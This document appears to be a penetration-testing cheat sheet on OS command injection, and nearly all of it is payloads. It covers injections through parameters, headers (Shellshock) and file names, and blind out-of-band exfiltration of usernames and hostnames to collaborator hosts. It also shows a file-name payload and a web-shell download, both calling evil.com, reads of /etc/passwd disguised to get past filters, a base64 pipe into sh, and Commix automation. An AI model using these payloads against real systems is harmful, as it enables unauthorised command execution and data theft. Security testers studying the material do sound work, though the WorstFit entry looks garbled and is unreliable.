# Command Injection: OS Command Execution

## Injection Points

### Parameter-Based
```bash
# Shell metacharacters in any parameter passed to:
# ping, nslookup, dig, curl, wget, whois, mail, convert
ping 127.0.0.1; id
nslookup target.com || id
curl http://internal/$(whoami)
```

### Header-Based
```http
User-Agent: () { :;}; echo "vulnerable"  # Shellshock
X-Forwarded-For: 127.0.0.1`id`
Referer: https://target.com/|id|
```

### Filename-Based
```bash
# Upload file named: $(curl evil.com/$(id)).txt
# Server processes filename in shell command
```

## Blind Command Injection

### Time-Based
```bash
| sleep 5
; ping -c 10 127.0.0.1
`timeout 5`
```

### OOB (DNS/HTTP)
```bash
| nslookup $(whoami).collaborator.oastify.com
; curl http://collaborator.oastify.com/$(hostname)
`wget --post-data="user=$(whoami)" http://collaborator.oastify.com/`
```

### Output Redirection
```bash
# Write output to web-accessible file
|| whoami > /var/www/html/output.txt ||
# Then fetch: GET /output.txt
```

## WAF Bypass

### Command Obfuscation
```bash
# Globbing
cat /e??/p????d  # Expands to /etc/passwd
# Variable injection
cat /e${FOO:-c}/pa${BAR:-sswd}
# Hex encoding
$'cat' /etc/passwd
# Base64 + eval
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | sh
```

### Argument Injection
Some commands are vulnerable to argument injection (not shell injection):
```bash
# curl argument injection
curl -o /tmp/shell.php http://evil.com/shell.txt
# Not metacharacters but flags that the application passes to the command
```

### WorstFit (Windows ANSI)
```bash
# Orange Tsai's WorstFit technique (CVE-2025-21204)
# Unicode characters that normalize to dangerous ASCII in Windows ANSI
# a with ring → a → can bypass filters
```

## No Argument Context Injection

When user input is in the middle of a command with no separator:
```bash
# Original: finger $user@internal.com
# Payload: $(id)@internal.com
finger $(id)@internal.com
# If the shell evaluates $() before the command runs, injection fires
```

## Automation

```bash
# Commix for automated exploitation
commix --url="https://target.com/page?cmd=test" --os-cmd="id"
# Manual confirmation
curl "https://target.com/ping?host=127.0.0.1%3Bid" -w "
"
```
